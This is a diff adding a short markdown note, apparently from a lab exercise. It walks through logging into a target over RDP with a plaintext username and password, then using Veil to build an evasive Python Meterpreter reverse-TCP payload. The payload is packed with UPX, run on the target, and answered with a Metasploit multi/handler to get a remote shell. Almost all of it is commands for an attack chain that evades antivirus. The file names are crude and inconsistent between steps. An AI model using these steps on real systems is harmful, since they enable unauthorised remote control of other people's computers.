@@ -1,0 +1,36 @@
+Connect to the target with rdesktop
+
+#rdesktop -u aline -p soccer 172.16.5.10
+
+veil and upx needs to be installed 
+
+- Veil is used to generate melicious payload 
+- Upx is used to compress the payload from veil
+
+https://github.com/Veil-Framework/Veil
+
+> veil
+> list
+> use 1 ( Evasion)
+> use 28 (python/meterpreter/rev_tcp)
+> options
+> set LHOST 172.16.5.101
+> set LPORT 1122
+> generate
+>fuckyou
+> use 1 (pyInstaller)
+
+# mv /var/lib/veil/output/compiled/fuckyou.exe .
+
+# upx --best --ultra-brute -f fuckyouleebl.exe -o fuckyouleebl2.exe
+
+Upload the exe file in the target and run that exe file.
+
+msf5> use multi/handler
+msf5> set LPORT and LHOST
+msf5> exploit 
+
+Finally got the shell
+
+
+
